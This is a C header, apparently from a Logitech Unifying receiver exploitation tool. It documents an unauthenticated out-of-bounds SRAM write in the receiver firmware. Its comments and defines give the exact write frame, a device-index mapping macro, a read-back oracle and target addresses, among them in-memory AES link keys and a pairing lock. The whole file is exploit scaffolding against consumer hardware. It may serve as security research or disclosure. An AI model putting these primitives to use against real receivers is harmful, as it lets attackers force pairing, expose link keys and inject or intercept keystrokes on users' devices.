/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include "logitech_unifying_firmware.h"

/*	GET_REGISTER 0x01 (handler 0x3132) reads XDATA 0x830e and returns its bit 1
 *	as bit 3 of Parameters[1]: the only read-back channel found for the DJ write
 *	window - the oracle that proved the OOB write on silicon (write, then read back).
 */
#define DJ_ORACLE_ADDRESS				0x830e
#define DJ_ORACLE_MASK					0x08 // in Parameters[1] of GET_REGISTER 0x01

 /*	Both DJ reports share ONE application collection, so Windows exposes a single
  *	PDO whose ReportByteLength is the MAXIMUM of the two (32) and whose
  *	NumberButtonCaps is 2. The lengths below are the WIRE lengths - not what to
  *	match a collection against, see KUNI_DJ_FindDevice.
  */
#define REPORT_ID_DJ_SHORT				0x20
#define REPORT_ID_DJ_LONG				0x21

#define REPORT_DJ_LENGTH_SHORT			15
#define REPORT_DJ_LENGTH_LONG			32

#define DJ_TYPE_DEVICE_CONNECTION		0x41
#define DJ_TYPE_GET_PAIRED				0x81 // {0xff, this} makes the receiver list its devices

#define DJ_TYPE_LEDS					0x0e // REPORT_TYPE_LEDS on the wire, but the handler stores report[3] in a per-device slot: a byte store, LEDs being only its nominal use

  /*	/!\ UNBOUNDED DEVICE INDEX - PROVEN ON SILICON /!\
   *
   *	Handler 0x534c, type 0x0e, with no bound check at all:
   *
   *	    R3   = report[1] - 1          ; only tested against 0xff
   *	    DPTR = 0x82a3 + R3            ; carry propagated into the high byte
   *	    MOVX @DPTR, report[3]
   *
   *	The table holds SIX entries - the sibling filling it from the LED report
   *	bounds with CJNE A,#0x06 (0x2e1f). So any index reaches 0x82a3..0x83a2.
   *
   *	Preconditions, both satisfied out of the box: wLength exactly 15 (0x4b9a),
   *	and IRAM 0x53 non-zero, which the SET_PROTOCOL sent at enumeration sets.
   *	No factory mode, no DFU.
   */
#define DJ_WRITE_FIRST					0x82a3
#define DJ_WRITE_LAST					0x83a2
#define DJ_WRITE_UNREACHABLE			0x83a1 // would need DeviceIndex 0xff

#define DJ_TARGET_DERIVED_KEYS			0x82ae // 6 x 16 bytes, the AES link keys in clear
#define DJ_TARGET_PAIRING_LOCK			0x830e // gates REGISTER_PAIRING (0xb2)
#define DJ_TARGET_FLASH_ADDR_CHECKED	0x8381
#define DJ_TARGET_FLASH_CB				0x8383
#define DJ_TARGET_FLASH_ADDR_USED		0x8384 // the address the write loop actually uses
#define DJ_TARGET_FLASH_SOURCE			0x8386 // {Space, HIBYTE, LOBYTE}, NEVER validated - but racing it to leak keys DOES NOT WORK (0x1dde reinits it every call, 47-cycle window vs >=136 to reach the write); don't retry

#define DJ_FAR_SPACE_IRAM				0x00
#define DJ_FAR_SPACE_XDATA				0x01 // 0x0000-0x7fff is the FLASH, 0x8000+ is the SRAM

#define KUNI_DJ_DeviceIndexForAddress(Addr)	((BYTE) (((Addr) - DJ_WRITE_FIRST + 1) & 0xff))

BOOL KUNI_DJ_FindDevice(KUNI_CO_HANDLE* pHandle);
void KUNI_DJ_CloseDevice(KUNI_CO_HANDLE* pHandle);

/*	The 0x0e write frame { 0x20, DeviceIndexForAddress(Address), 0x0e, Value } - a
 *	legitimate "set LEDs" the firmware forwards as a byte store, so an out-of-range
 *	address writes one byte anywhere in DJ_WRITE_FIRST..DJ_WRITE_LAST. Only the frame
 *	is built here; the spray owns the sending (its own async ring, no synchronous caller).
 */
void KUNI_DJ_BuildWriteFrame(BYTE Frame[REPORT_DJ_LENGTH_SHORT], WORD Address, BYTE Value);

// The DJ_WRITE_* / DJ_TARGET_* / DJ_ORACLE_* addresses above document the firmware's unauthenticated SRAM-write
// window; their manual write/proof/flash-source helpers were dropped as dead code (the spray builds its own 0x0e frame).
